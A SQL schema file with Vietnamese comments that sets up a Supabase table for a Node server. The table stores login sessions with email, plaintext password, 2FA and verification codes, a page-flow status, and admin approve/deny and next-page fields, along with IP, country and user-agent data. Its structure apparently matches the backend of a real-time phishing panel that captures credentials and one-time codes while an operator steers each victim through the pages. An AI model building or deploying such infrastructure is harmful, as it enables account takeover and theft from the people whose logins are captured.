-- ============================================================================
-- server.cjs persistence table
-- Chạy file này trong Supabase SQL Editor để tạo bảng lưu tất cả các request
-- mà server.cjs đang giữ trong RAM. Sau khi chạy xong, server.cjs sẽ dùng
-- bảng này làm kho dữ liệu -> restart server KHÔNG còn mất data.
--
-- Project: https://tmsgxgjzzrcdhsxdqgdi.supabase.co
-- ============================================================================

create extension if not exists "pgcrypto";

-- Bảng chính: 1 hàng = 1 phiên login của user
create table if not exists public.login_requests (
    -- ID do server tự tăng (giữ kiểu int để tương thích code hiện tại)
    id                 bigserial primary key,

    -- Thông tin nhận từ frontend
    email              text not null,
    session_id         text,
    password           text default '',
    twofa              text default '',
    verification_code  text default '',

    -- Trạng thái phiên
    page_status        text default 'Login',   -- "Login" | "Password" | "Setup Code Phone" | "Notification" | ...
    status             text default 'pending'  -- "pending" | "approved" | "denied"
                       check (status in ('pending','approved','denied')),
    next_page          text default '',

    -- Forensics
    user_agent         text default '',
    ip                 text default '',
    country            text default '',
    country_code       text default '',

    -- Admin metadata
    tag                text default '',
    note               text default '',

    -- Timestamps
    created_at         timestamptz not null default now(),
    last_seen          timestamptz
);

-- Index để findByEmail() chạy nhanh
create index if not exists login_requests_email_idx
    on public.login_requests (email);

create index if not exists login_requests_status_idx
    on public.login_requests (status);

create index if not exists login_requests_created_at_idx
    on public.login_requests (created_at desc);


-- ============================================================================
-- Row Level Security
-- server.cjs sẽ dùng SERVICE_ROLE key (bypass RLS hoàn toàn) nên RLS bật
-- chỉ để chặn anon / client khác đọc dữ liệu nhạy cảm.
-- ============================================================================
alter table public.login_requests enable row level security;

-- KHÔNG tạo policy cho anon -> anon không đọc/ghi được gì.
-- Service role (dùng trong server.cjs) tự động bypass RLS.

-- Nếu bạn muốn admin-gui gọi thẳng Supabase (không qua server.cjs),
-- bỏ comment 2 policy dưới đây và dùng anon key:
--
-- create policy "anon read requests" on public.login_requests
--     for select to anon using (true);
-- create policy "anon insert requests" on public.login_requests
--     for insert to anon with check (true);
